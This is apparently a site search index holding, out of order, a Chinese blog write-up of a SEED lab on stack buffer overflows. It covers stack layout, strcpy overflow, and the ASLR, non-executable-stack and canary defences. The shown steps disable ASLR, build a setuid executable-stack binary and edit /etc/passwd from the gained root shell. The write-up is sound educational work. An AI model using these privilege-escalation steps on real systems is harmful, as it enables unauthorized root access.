\u8fd0\u884cstack\u7a0b\u5e8f\uff0c\u5c31\u4f1a\u8fdb\u5165\u5230\u4e00\u4e2a\u5177\u6709sudo\u6743\u9650\u7684sh\u7a0b\u5e8f\u91cc\u3002 ./stack \u5728\u8fd9\u4e2ash\u91cc\uff0c\u53ef\u4ee5\u5bf9\u53d7\u4fdd\u62a4\u6587\u4ef6\u8fdb\u884c\u4fee\u6539\uff0c\u4f8b\u5982 vim /etc/passwd \u53ef\u89c1\uff0c\u6210\u529f\u5730\u83b7\u53d6\u4e86\u7cfb\u7edf\u7684root\u6743\u9650\u3002 \u5bf9\u4e8e\u6808\u6ea2\u51fa\u7684\u4fdd\u62a4\u63aa\u65bd \u00b6 \u5728\u8fdb\u884c\u5b9e\u9a8c\u65f6\uff0c\u6211\u4eec\u505c\u7528\u4e86\u51e0\u4e2a\u4fdd\u62a4\u63aa\u65bd\uff0c\u73b0\u5728\u6211\u4eec\u6765\u63a2\u8ba8\u4e00\u4e0b\u8fd9\u4e9b\u4fdd\u62a4\u63aa\u65bd\u662f\u5982\u4f55\u62b5\u5fa1\u6808\u6ea2\u51fa\u653b\u51fb\u7684\u3002 \u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316 \u00b6 \u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\uff0c\u987e\u540d\u601d\u4e49\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u52a0\u8f7d\u5230\u7684\u5185\u5b58\u4f4d\u7f6e\u662f\u968f\u673a\u7684\uff0c\u6240\u4ee5\uff0c\u5373\u4f7f\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u63a7\u5236\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u4f46\u662f\u65e0\u6cd5\u786e\u5b9a\u6076\u610f\u4ee3\u7801\u7684\u4f4d\u7f6e\uff0c\u56e0\u6b64\uff0c\u53ef\u4ee5\u6709\u6548\u5730\u9632\u8303\u6808\u6ea2\u51fa\u653b\u51fb\u3002 \u73b0\u5728\u6211\u4eec\u5f00\u542f\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\u518d\u8fdb\u884c\u91cd\u590d\u4e0a\u8ff0\u653b\u51fb su root sysctl -w kernel.randomize_va_space=2 exit ./stack \u4f7f\u7528gdb\u67e5\u770b str \u7684\u5730\u5740\uff0c\u53d1\u73b0\u5df2\u7ecf\u4e0d\u662f\u539f\u6765\u76840xbfffea37\u4e86\uff0c\u653b\u51fb\u5931\u8d25\u65f6\u663e\u7136\u6613\u89c1\u7684\u3002 \u4e0d\u53ef\u6267\u884c\u6808 \u00b6 \u4e0d\u53ef\u6267\u884c\u6808\u7684\u57fa\u672c\u539f\u7406\u662f\u5c06\u6570\u636e\u6240\u5728\u7684\u5185\u5b58\u9875\u6807\u8bb0\u4e3a\u4e0d\u53ef\u6267\u884c\u7684\uff0c\u5f53\u8fdb\u7a0b\u5c1d\u8bd5\u53bb\u6267\u884c\u6570\u636e\u9875\u9762\u4e0a\u7684\u6307\u4ee4\u65f6\uff0cCPU\u5c31\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u800c\u4e0d\u662f\u53bb\u6267\u884c\u3002\u6240\u4ee5\uff0c\u5f53\u5f00\u542f\u4e86\u4e0d\u53ef\u6267\u884c\u6808\u9009\u9879\u65f6\uff0c\u5373\u4f7f\u6211\u4eec\u7684\u6076\u610f\u4ee3\u7801\u5df2\u7ecf\u63d2\u5165\u5230\u5185\u5b58\uff0c\u4f46\u7531\u4e8e\u5904\u5728\u6570\u636e\u9875\u9762\uff0c\u56e0\u6b64\u65e0\u6cd5\u6267\u884c\u3002 \u518d\u6b21\u5173\u95ed\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\uff0cgcc\u7f16\u8bd1stack\u65f6\u5f00\u542f\u4e0d\u53ef\u6267\u884c\u6808\u9009\u9879 su root sysctl -w kernel.randomize_va_space=0 gcc -g -fno-stack-protector stack.c -o stack # gcc\u9ed8\u8ba4\u5f00\u542f\u4e0d\u53ef\u6267\u884c\u6808 chmod 4755 stack exit \u4f7f\u7528gdb\u67e5\u770b str \u4f4d\u7f6e\u65f6\uff0c\u53d1\u73b0\u53c8\u56de\u5230\u4e86\u539f\u6765\u7684\u4f4d\u7f6e\u4e0a \u8fdb\u884c\u653b\u51fb\uff0c\u4ecd\u7136\u5931\u8d25 Stack Guard \u00b6 gcc\u4e2d\u7684Stack Guard\u7684\u4fdd\u62a4\u539f\u7406\u65f6\u5229\u7528 \"Canaries\" \u68c0\u6d4b\u5bf9\u51fd\u6570\u6808\u7684\u7834\u574f\u3002\u5177\u4f53\u662f\u518d\u7f13\u51b2\u533a\uff08\u5982\uff1a\u6808\uff09\u548c\u63a7\u5236\u4fe1\u606f\uff08\u5982 ebp\u7b49\uff09\u95f4\u63d2\u5165\u4e00\u4e2acanary word\u3002\u8fd9\u6837\uff0c\u5f53\u7f13\u51b2\u533a\u6ea2\u51fa\u65f6\uff0c\u518d\u8fd4\u56de\u5730\u5740\u88ab\u8986\u76d6\u4e4b\u524dcanary word\u4f1a\u9996\u5148\u88ab\u8986\u76d6\uff0c\u901a\u8fc7\u68c0\u6d4bcanary word\u7684\u503c\u662f\u5426\u88ab\u4fee\u6539\uff0c\u5c31\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u4e86\u6ea2\u51fa\u3002\u8fd8\u662f\u4ee5\u4e0a\u8ff0\u7684 \u7b80\u5355c\u7a0b\u5e8f \u4e3a\u4f8b gcc\u5f00\u542fStack Guard\u5bf9fun.c\u8fdb\u884c\u7f16\u8bd1\uff0c\u7136\u540e\u7528gdb\u67e5\u770b fun \u51fd\u6570\u7684\u6c47\u7f16 gcc -g fun.c -o fun # gcc\u9ed8\u8ba4\u5f00\u542fStack Guard gdb fun disass fun \u548c \u4e0a\u56fe \u6700\u5927\u5dee\u522b\u5728\u4e8e\u51fd\u6570\u771f\u6b63\u6267\u884c\u524d\u591a\u4e86\u4ee5\u4e0b\u51e0\u6761\u6307\u4ee4 \u4ee5\u53ca\u9000\u51fa\u4e4b\u524d\uff0c\u591a\u4e86\u4ee5\u4e0b\u51e0\u6761\u6307\u4ee4 \u901a\u8fc7\u67e5\u9605\u8d44\u6599\u53ef\u77e5\uff0cgs:0x14\u91cc\u4fdd\u5b58\u7684\u662f\u4e00\u4e2a\u968f\u673a\u6570\uff0c\u8fd9\u4e2a\u968f\u673a\u6570\u5c31\u662fcanary word\u3002\u771f\u6b63\u6267\u884c\u51fd\u6570\u524d\u7684\u6307\u4ee4<+6>\u5230<+15>\u628a\u8fd9canary word\u653e\u5230ebp-0xc\u4f4d\u7f6e\u4e0a\uff0c\u800c\u51fd\u6570\u8fd4\u56de\u524d\u7684<+41>\u5230<+53>\u6307\u4ee4\u5c31\u662f\u5224\u65adcanary word\u662f\u5426\u88ab\u4fee\u6539\uff0c\u5982\u679c\u6ca1\u88ab\u4fee\u6539\u5219\u6b63\u5e38\u8fd4\u56de\u3002\u7531\u6b64\u6211\u4eec\u53ef\u4ee5\u5927\u6982\u5730\u753b\u51fa\u6b64\u65f6\u51fd\u6570\u6808\u5185\u7684\u5206\u5e03\u5982\u4e0b \u5982\u679c\u901a\u8fc7\u4e4b\u524d\u7684\u65b9\u6cd5\u53bb\u4fee\u6539\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u5c31\u4f1a\u4fee\u6539\u4e86canary word\u7684\u503c\uff0c\u5c31\u5728\u51fd\u6570\u8fd4\u56de\u524d\u4f1a\u88ab\u68c0\u6d4b\u5230\u3002\u4e0b\u9762\u662f\u5f00\u542f\u4e86Stack Guard\u6765\u91cd\u590d\u4e0a\u9762\u7684\u653b\u51fb su root gcc -g -z execstack stack.c -o stack chmod 4755 stack exit ./stack \u53ef\u4ee5\u770b\u5230\uff0c\u6808\u6ea2\u51fa\u88ab\u68c0\u6d4b\u5230\u5e76\u7ec8\u6b62\u4e86\u8fdb\u7a0b\u3002 \u7ed3\u675f\u8bed \u00b6 \u901a\u8fc7\u8fd9\u6b21\u5b9e\u9a8c\uff0c\u52a0\u6df1\u4e86\u6211\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u3001\u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406\u3001\u7f16\u8bd1\u5668\u7b49\u65b9\u9762\u7684\u7406\u89e3\uff0c\u540c\u65f6\u4e5f\u8ba4\u8bc6\u5230\u4e86\u7f13\u51b2\u533a\u6ea2\u51fa\u6240\u5e26\u6765\u7684\u5371\u5bb3\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u8981\u517b\u6210\u826f\u597d\u7684\u7f16\u7a0b\u4e60\u60ef\uff0c\u4f8b\u5982\u4f7f\u7528\u5b89\u5168\u578b\u51fd\u6570\u907f\u514d\u98ce\u9669\u3002 \u53c2\u8003 \u00b6 GCC \u4e2d\u7684\u7f16\u8bd1\u5668\u5806\u6808\u4fdd\u62a4\u6280\u672f SEED BOOKS","title":"\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb"},{"location":"operation_system/2020_12_24_buffer_overflow_attack/#_1","text":"\u7f13\u51b2\u533a\u6ea2\u51fa(buffer-overflow)\u662f\u4e00\u79cd\u975e\u5e38\u666e\u904d\u3001\u540c\u65f6\u975e\u5e38\u5371\u9669\u7684\u6f0f\u6d1e\uff0c\u5728\u5404\u79cd\u64cd\u4f5c\u7cfb\u7edf\u3001\u5e94\u7528\u8f6f\u4ef6\u4e2d\u5e7f\u6cdb\u5b58\u5728\u3002\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u662f\u5229\u7528\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e\u6240\u8fdb\u884c\u7684\u653b\u51fb\uff0c\u8f7b\u5219\u53ef\u4ee5\u5bfc\u81f4\u7a0b\u5e8f\u5931\u8d25\u3001\u7cfb\u7edf\u5173\u673a\u7b49\uff0c\u91cd\u5219\u53ef\u4ee5\u5229\u7528\u5b83\u6267\u884c\u975e\u6388\u6743\u6307\u4ee4\uff0c\u751a\u81f3\u83b7\u53d6\u7cfb\u7edf\u7279\u6743\uff0c\u4ece\u800c\u8fdb\u884c\u5176\u5b83\u7684\u975e\u6cd5\u64cd\u4f5c\u3002\u7f13\u51b2\u533a\u653b\u51fb\u6709\u6808\u6ea2\u51fa\u3001\u5806\u6ea2\u51fa\u3001\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3001\u6574\u5f62\u53d8\u91cf\u6ea2\u51fa\u7b49\u3002\u672c\u6587\u5c06\u4e3b\u8981\u4ecb\u7ecd\u5806\u6808\u6ea2\u51fa\u653b\u51fb\uff0c\u5e76\u5b9e\u73b0\u5bf9\u4e00\u4e2aubuntu 16.04\u7cfb\u7edf\u7684\u7b80\u5355\u7684\u6808\u653b\u51fb\uff0c\u83b7\u53d6\u5176root\u6743\u9650\u3002","title":"\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb"},{"location":"operation_system/2020_12_24_buffer_overflow_attack/#_2","text":"\u64cd\u4f5c\u7cfb\u7edf\uff1aSEED Ubuntu16.04 VM (32-bit)\uff0c\u955c\u50cf\u4e0b\u8f7d\u5730\u5740\uff1ahttps://seedsecuritylabs.org/lab_env.html \u865a\u62df\u673a\uff1aOracle VM VirtualBox 6.0.4","title":"\u5b9e\u9a8c\u5e73\u53f0"},{"location":"operation_system/2020_12_24_buffer_overflow_attack/#_3","text":"\u5728\u8ba1\u7b97\u673a\u91cc\uff0c\u5806\u6808\u662f\u5185\u5b58\u91cc\u7684\u4e00\u6bb5\u533a\u57df\u3002\u5806\u4e00\u822c\u7531\u7a0b\u5e8f\u5458\u5206\u914d\u91ca\u653e\uff0c\u5982\u679c\u7a0b\u5e8f\u5458\u4e0d\u91ca\u653e\uff0c\u7a0b\u5e8f\u7ed3\u675f\u65f6\u53ef\u80fd\u7531\u64cd\u4f5c\u7cfb\u7edf\u56de\u6536\uff0c\u5206\u914d\u65b9\u5f0f\u7c7b\u4f3c\u4e8e\u6570\u636e\u7ed3\u6784\u4e2d\u7684\u94fe\u8868\uff1b\u6808\u7531\u64cd\u4f5c\u7cfb\u7edf\u81ea\u52a8\u5206\u914d\u91ca\u653e\uff0c\u5b58\u653e\u51fd\u6570\u7684\u53c2\u6570\u503c\u3001\u5c40\u90e8\u53d8\u91cf\u3001\u8fd4\u56de\u5730\u5740\u7b49\uff0c\u5206\u914d\u65b9\u5f0f\u7c7b\u4f3c\u4e8e\u6570\u636e\u7ed3\u6784\u4e2d\u7684\u6808\u3002\u4ee5\u5806\u6808\u6ea2\u51fa\u4e3a\u4ee3\u8868\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\u5df2\u7ecf\u6210\u4e3a\u6700\u666e\u904d\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u7531\u6b64\u5f15\u53d1\u7684\u5b89\u5168\u95ee\u9898\u6bd4\u6bd4\u7686\u662f\u3002\u5806\u6808\u6ea2\u51fa\u7684\u539f\u56e0\u4e00\u822c\u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a \u51fd\u6570\u8c03\u7528\u5c42\u6b21\u592a\u6df1\u3002\u51fd\u6570\u9012\u5f52\u8c03\u7528\u65f6\uff0c\u7cfb\u7edf\u8981\u5728\u6808\u4e2d\u4e0d\u65ad\u4fdd\u5b58\u51fd\u6570\u8c03\u7528\u65f6\u7684\u73b0\u573a\u548c\u4ea7\u751f\u7684\u53d8\u91cf\uff0c\u5982\u679c\u9012\u5f52\u8c03\u7528\u592a\u6df1\uff0c\u5c31\u4f1a\u9020\u6210\u6808\u6ea2\u51fa\uff0c\u8fd9\u65f6\u9012\u5f52\u65e0\u6cd5\u8fd4\u56de\u3002\u518d\u6709\uff0c\u5f53\u51fd\u6570\u8c03\u7528\u5c42\u6b21\u8fc7\u6df1\u65f6\u4e5f\u53ef\u80fd\u5bfc\u81f4\u6808\u65e0\u6cd5\u5bb9\u7eb3\u8fd9\u4e9b\u8c03\u7528\u7684\u8fd4\u56de\u5730\u5740\u800c\u9020\u6210\u6808\u6ea2\u51fa\u3002 \u52a8\u6001\u7533\u8bf7\u7a7a\u95f4\u4f7f\u7528\u4e4b\u540e\u6ca1\u6709\u91ca\u653e\u3002\u7531\u4e8eC\u8bed\u8a00\u4e2d\u6ca1\u6709\u5783\u573e\u8d44\u6e90\u81ea\u52a8\u56de\u6536\u673a\u5236\uff0c\u56e0\u6b64\uff0c\u9700\u8981\u7a0b\u5e8f\u4e3b\u52a8\u91ca\u653e\u5df2\u7ecf\u4e0d\u518d\u4f7f\u7528\u7684\u52a8\u6001\u5730\u5740\u7a7a\u95f4\u3002\u7533\u8bf7\u7684\u52a8\u6001\u7a7a\u95f4\u4f7f\u7528\u7684\u662f\u5806\u7a7a\u95f4\uff0c\u52a8\u6001\u7a7a\u95f4\u4f7f\u7528\u4e0d\u4f1a\u9020\u6210\u5806\u6ea2\u51fa\u3002 \u6570\u7ec4\u8bbf\u95ee\u8d8a\u754c\u3002C\u8bed\u8a00\u6ca1\u6709\u63d0\u4f9b\u6570\u7ec4\u4e0b\u6807\u8d8a\u754c\u68c0\u67e5\uff0c\u5982\u679c\u5728\u7a0b\u5e8f\u4e2d\u51fa\u73b0\u6570\u7ec4\u4e0b\u6807\u8bbf\u95ee\u8d85\u51fa\u6570\u7ec4\u8303\u56f4\uff0c\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u4f1a\u5185\u5b58\u8bbf\u95ee\u9519\u8bef\u3002 \u6307\u9488\u975e\u6cd5\u8bbf\u95ee\u3002\u6307\u9488\u4fdd\u5b58\u4e86\u4e00\u4e2a\u975e\u6cd5\u7684\u5730\u5740\uff0c\u901a\u8fc7\u8fd9\u6837\u7684\u6307\u9488\u8bbf\u95ee\u6240\u6307\u5411\u7684\u5730\u5740\u65f6\u4f1a\u4ea7\u751f\u5185\u5b58\u8bbf\u95ee\u9519\u8bef\u3002 \u5728\u4e00\u4e9b\u9ad8\u7ea7\u8bed\u8a00\u4e2d\uff0c\u7c7b\u4f3cpython, java, go\u7b49\uff0c\u6709\u4e00\u4e9b\u673a\u5236\u7528\u4e8e\u9632\u6b62\u6808\u6ea2\u51fa\uff0c\u6bd4\u5982\uff0cpython\u9ed8\u8ba4\u7684\u9012\u5f52\u6df1\u5ea6\u662f1000\uff0c\u5f53\u9012\u5f52\u8c03\u7528\u8d85\u8fc7\u8fd9\u4e2a\u6df1\u5ea6\u540e\u5c31\u4f1a\u5f15\u53d1\u5f02\u5e38\u3002\u6b64\u5916\uff0c\u7f16\u8bd1\u5668\u5c42\u9762\u4e0a\u4e5f\u6709\u5bf9\u5806\u6808\u8fdb\u884c\u4fdd\u62a4\uff0c\u5176\u4e2d\u6700\u8457\u540d\u7684\u662fStack Guard\u548cStack-smashing Protectection\u3002\u5728\u64cd\u4f5c\u7cfb\u7edf\u7684\u5c42\u9762\u4e0a\uff0c\u4e3a\u4e86\u51cf\u5c11\u5806\u6808\u6ea2\u51fa\u5e26\u6765\u7684\u5371\u5bb3\uff0c\u8fd8\u6709\u7c7b\u4f3c\u4e8e\u5730\u5740\u7a7a\u95f4\u968f\u673a\u5316\u7684\u673a\u5236\u3002","title":"\u5806\u6808\u6ea2\u51fa\u539f\u7406"},{"location":"operation_system/2020_12_24_buffer_overflow_attack/#_4","text":"\u4e3a\u4e86\u8fdb\u4e00\u6b65\u4e86\u89e3\u5806\u6808\u6ea2\u51fa\u7684\u5de5\u4f5c\u539f\u7406\uff0c\u9996\u5148\u6765\u4e86\u89e3\u4e00\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u662f\u5982\u4f55\u5206\u914d\u7684\u3002\u5bf9\u4e8e\u4e00\u4e2a\u5178\u578b\u7684C\u8bed\u8a00\u7a0b\u5e8f\uff0c\u5176\u8fd0\u884c\u65f6\uff0c\u5185\u5b58\u75315\u4e2a\u77ed\u7ec4\u6210\uff0c\u5206\u522b\u4e3a\u4ee3\u7801\u6bb5\uff08text segment\uff09\uff0c\u6570\u636e\u6bb5\uff08data segment\uff09\uff0cBSS\u6bb5\uff08BSS segment\uff09\uff0c\u5806\uff08heap\uff09\uff0c\u6808\uff08stack\uff09\uff0c\u8fd95\u4e2a\u6bb5\u5728\u5185\u5b58\u4e2d\u5206\u5e03\u5982\u4e0b \u4ee3\u7801\u6bb5\u4e2d\u5b58\u653e\u7a0b\u5e8f\u7684\u4ee3\u7801\uff1b\u6570\u636e\u6bb5\u4e2d\u5b58\u653e\u7740\u7531\u7a0b\u5e8f\u5458\u521d\u59cb\u5316\u7684\u9759\u6001/\u5168\u5c40\u53d8\u91cf\uff0c\u4f8b\u5982\uff0c stack int a=3; \u4e2d\u7684 a \u53d8\u91cf\uff1bBSS\u6bb5\u4e2d\u5b58\u653e\u7740\u672a\u521d\u59cb\u5316\u7684\u9759\u6001/\u5168\u5c40\u53d8\u91cf\uff0c\u4f8b\u5982\uff0c stack int b; \u4e2d\u7684 b \u53d8\u91cf\uff1b\u5806\u662f\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58\uff0cc\u8bed\u8a00\u4e2d\uff0c malloc \u3001 calloc \u7b49\u51fd\u6570\u7528\u4e8e\u7533\u8bf7\u52a8\u6001\u5185\u5b58\uff0c free \u51fd\u6570\u7528\u4e8e\u91ca\u653e\uff0c\u5728\u9014\u4e2d\u662f\u5411\u4e0a\u589e\u957f\uff1b\u6808\u5219\u5b58\u653e\u51fd\u6570\u5185\u5b9a\u4e49\u7684\u5c40\u90e8\u53d8\u91cf\u3001\u51fd\u6570\u8fd4\u56de\u5730\u5740\u3001\u51fd\u6570\u53c2\u6570\u7b49\uff0c\u5728\u56fe\u4e2d\u662f\u5411\u4e0b\u589e\u957f\u3002\u6ce8\u610f\uff0c\u5728\u73b0\u5728\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u8fd9\u51e0\u4e2a\u6bb5\u4e0d\u4e00\u5b9a\u662f\u8fde\u5728\u4e00\u8d77\u7684\u3002 \u8fd9\u6b21\u6211\u4eec\u5b9e\u73b0\u7684\u662f\u6808\u6ea2\u51fa\u653b\u51fb\uff0c\u6240\u4ee5\u6211\u4eec\u5177\u4f53\u770b\u4e00\u4e0b\u4e00\u4e2a\u51fd\u6570\u5728\u6808\u91cc\u9762\u7684\u6570\u636e\u7684\u5206\u5e03\uff0c\u4ee5\u53ca\u4e00\u4e2a\u51fd\u6570\u662f\u5982\u4f55\u88ab\u8c03\u7528\u7684\uff0c\u4ee5 \u4e00\u4e2a\u7b80\u5355\u7684c\u8bed\u8a00\u7a0b\u5e8f \u4e3a\u4f8b /* fun.c */ #include<stdio.h> int fun(int a, int b) { int l[3]; l[0] = a; l[1] = b; l[2] = a + b; } int main() { fun(1, 2); } \u5148\u7528gcc\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u7f16\u8bd1 gcc -g -fno-stack-protector fun.c -o fun \u5728\u4f7f\u7528gdb\u5bf9fun\u7a0b\u5e8f\u8fdb\u884c\u8c03\u8bd5\uff0c\u9996\u5148\u53cd\u6c47\u7f16 main \u51fd\u6570\uff0c\u770b\u4e00\u4e0b\u662f\u5982\u4f55\u8c03\u7528 fun \u51fd\u6570\u7684 gdb fun disass main \u4ece<+3>\u5230<+12>\u5c31\u662f\u4e00\u4e2a\u5b8c\u6574\u7684\u51fd\u6570\u8c03\u7528\u8fc7\u7a0b\u3002\u53ef\u4ee5\u770b\u5230\uff0c\u8c03\u7528 fun \u51fd\u6570\u65f6\uff0c\u9996\u5148\u901a\u8fc7<+3>\u548c<+5>\u4e24\u6761\u6307\u4ee4\u628a\u51fd\u6570\u53c2\u6570\u538b\u8fdb\u6808\u91cc\uff0c\u7136\u540e\u4f7f\u7528 call \u6307\u4ee4\u8df3\u8f6c\u6267\u884c\uff0c\u800c\u4e00\u6761 call \u6307\u4ee4\u4f1a\u5148\u628aeip\u5bc4\u5b58\u5668\u7684\u5185\u5bb9\u538b\u8fdb\u6808\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u88ab\u8c03\u7528\u51fd\u6570\u91cc\u6267\u884c\uff0ceip\u5bc4\u5b58\u5668\u91cc\u5b58\u653e\u7740 call \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u4e5f\u5c31\u662f\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u5373\u4e00\u6761 call \u6307\u4ee4\u76f8\u5f53\u4e8e push eip ; \u6b64\u65f6eip\u5bc4\u5b58\u5668\u91cc\u7684\u503c\u662f\u6307\u4ee4<+12>\u7684\u5730\u5740 jmp 0x80484db ; fun\u51fd\u6570\u7684\u8d77\u59cb\u5730\u5740 \u987a\u5229\u4ece fun \u51fd\u6570\u8fd4\u56de\u540e\uff0c\u6307\u4ee4<+12>\u7684\u4f5c\u7528\u6e05\u7a7a\u6808\u91cc\u4f20\u7ed9\u51fd\u6570\u7684\u53c2\u6570\u3002 \u7136\u540e\u5bf9 fun \u51fd\u6570\u8fdb\u884c\u53cd\u6c47\u7f16\uff0c\u770b\u4e00\u4e0b fun \u51fd\u6570\u91cc\u7684\u5c40\u90e8\u53d8\u91cf\u662f\u5982\u4f55\u5206\u5e03\u7684\uff0c\u4ee5\u53ca\u5982\u4f55\u8fd4\u56de\u5230 main \u51fd\u6570\uff0c\u7ed3\u679c\u5982 \u4e0b\u56fe \u6240\u793a disass fun \u5728\u51fd\u6570\u7684\u5f00\u5934\uff0c\u9996\u5148\u662f<+0>\u548c<+1>\u4e24\u6761\u6307\u4ee4\u5bf9ebp\u5bc4\u5b58\u5668\u7684\u64cd\u4f5c\uff0cebp\u5bc4\u5b58\u5668\u53c8\u53eb\u57fa\u5740\u6307\u9488(extended base pointer)\u5bc4\u5b58\u5668\u3002\u51fd\u6570\u7684\u5c40\u90e8\u53d8\u91cf\u3001\u53c2\u6570\u7b49\u662f\u4fdd\u5b58\u5728\u6808\u91cc\u7684\uff0c\u800c\u5728\u51fd\u6570\u8fd0\u884c\u65f6\uff0c\u6808\u6307\u9488\u5bc4\u5b58\u5668esp\u7684\u503c\u4f1a\u53d1\u751f\u6539\u53d8\uff0c\u6240\u4ee5\u65e0\u6cd5\u901a\u8fc7esp\u8bbf\u95ee\u5230\u8fd9\u4e9b\u53d8\u91cf\u548c\u53c2\u6570\uff0c\u56e0\u6b64\u5f15\u5165\u4e86ebp\u5bc4\u5b58\u5668\uff0c\u4fdd\u5b58\u7740\u6808\u4e2d\u7684\u4e00\u4e2a\u56fa\u5b9a\u7684\u5730\u5740\uff0c\u901a\u8fc7\u8ba1\u7b97\u76f8\u5bf9\u4e8e\u8be5\u5730\u5740\u7684\u504f\u79fb\u91cf\u5373\u53ef\u8bbf\u95ee\u5230\u53d8\u91cf\u548c\u53c2\u6570\u3002\u572832\u4f4d\u7cfb\u7edf\u4e2d\uff0c\u4e00\u4e2aint\u7c7b\u578b\u3001\u8fd4\u56de\u5730\u5740\u3001\u5bc4\u5b58\u5668\u5927\u5c0f\u90fd\u662f4\u4e2a\u5b57\u8282\u3002\u6b64\u5916\u7531 main \u51fd\u6570\u7684\u6c47\u7f16\u4ee3\u7801\u53ef\u4ee5\u770b\u5230\u662f\u53c2\u6570 b \u5148\u8fdb\u6808(\u6307\u4ee4<+3>)\uff0c\u518d\u662f\u53c2\u6570 a \u8fdb\u6808\u3002\u56e0\u6b64\uff0c\u6307\u4ee4<+6>\u4e2d[ebp+0x8]\u8bbf\u95ee\u7684\u662f\u53c2\u6570 a \uff0c\u7531\u6b64\u53ef\u4ee5\u63a8\u65ad\u6307\u4ee4<+9>\u4e2d[ebp-0xc]\u8bbf\u95ee\u7684\u662f l[0] \uff0c\u4e24\u6761\u6c47\u7f16\u6307\u4ee4\u5bf9\u5e94\u7684c\u4ee3\u7801\u662f l[0] = a \u3002\u6307\u4ee4<+12>\u5230<+29>\u5206\u6790\u4e5f\u662f\u7c7b\u4f3c\u7684\u3002 \u6307\u4ee4<+30>\u548c<+31>\u662f\u4ece fun \u51fd\u6570\u8fd4\u56de main \u51fd\u6570\u7684\u8fc7\u7a0b\u3002 leave \u6307\u4ee4\u76f8\u5f53\u4e8e mov esp,ebp \u548c pop ebp \uff0c\u5373\u6062\u590d\u4e86\u8fdb\u5165 fun \u51fd\u6570\u65f6ebp\u548cesp\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u800c ret \u6307\u4ee4\u76f8\u5f53\u4e8e pop eip \uff0c\u5373\u628a\u6808\u4e2d\u7684\u51fd\u6570\u8fd4\u56de\u5730\u5740\u5f39\u51fa\uff0c\u653e\u5165eip\u5bc4\u5b58\u5668\u4e2d\uff0c\u5b9e\u73b0\u8fd4\u56de\u5230 main \u51fd\u6570\u3002 \u901a\u8fc7\u4e0a\u8ff0\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u83b7\u77e5 fun \u51fd\u6570\u7684\u6808\u5206\u5e03\u5982\u4e0b\u56fe\u6240\u793a \u4ece\u56fe\u4e2d\u5c31\u53ef\u4ee5\u5927\u81f4\u770b\u5230\u8fdb\u884c\u6808\u6ea2\u51fa\u653b\u51fb\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5373\u8d8a\u8fc7\u6570\u7ec4 l \u7684\u8fb9\u754c\u53bb\u4fee\u6539\u51fd\u6570\u8fd4\u56de\u5730\u5740\uff0c\u4ece\u800c\u8df3\u8f6c\u5230\u4e00\u6bb5\u6076\u610f\u4ee3\u7801\u53bb\u6267\u884c\uff0c\u5373\u7c7b\u4f3c l[4]=somewhere \u3002\u5728c\u8bed\u8a00\u4e2d\uff0c\u7c7b\u4f3c strcpy \u51fd\u6570\u7b49\u662f\u6ca1\u6709\u8fb9\u754c\u68c0\u67e5\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 strcpy \u51fd\u6570\u5411\u4e00\u4e2a\u5b57\u7b26\u4e32\u6570\u7ec4\u62f7\u8d1d\u8d85\u8fc7\u5176\u5927\u5c0f\u7684\u5185\u5bb9\uff0c\u4ece\u800c\u4fee\u6539\u51fd\u6570\u8fd4\u56de\u5730\u5740\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u7a0d\u540e\u5b9e\u73b0\u7684\u6808\u6ea2\u51fa\u653b\u51fb\u7684\u539f\u7406\u3002 // \u5411buf\u62f7\u8d1d\u8d85\u8fc7\u5176\u5927\u5c0f\u7684\u5185\u5bb9\u3002 #include<stdio.h> #include<string.h> int main() { char buf[3]; char *s=\"hello,world\"; strcpy(buf,s); } \u8fd9\u4e2a\u653b\u51fb\u7684\u601d\u8def\u5c31\u662f\uff0c\u9996\u5148\u5728\u5185\u5b58\u4e2d\u653e\u7f6e\u4e00\u6bb5\u53ef\u4ee5\u83b7\u53d6root\u6743\u9650\u6076\u610f\u4ee3\u7801\uff0c\u7136\u540e\u5229\u7528 strcpy 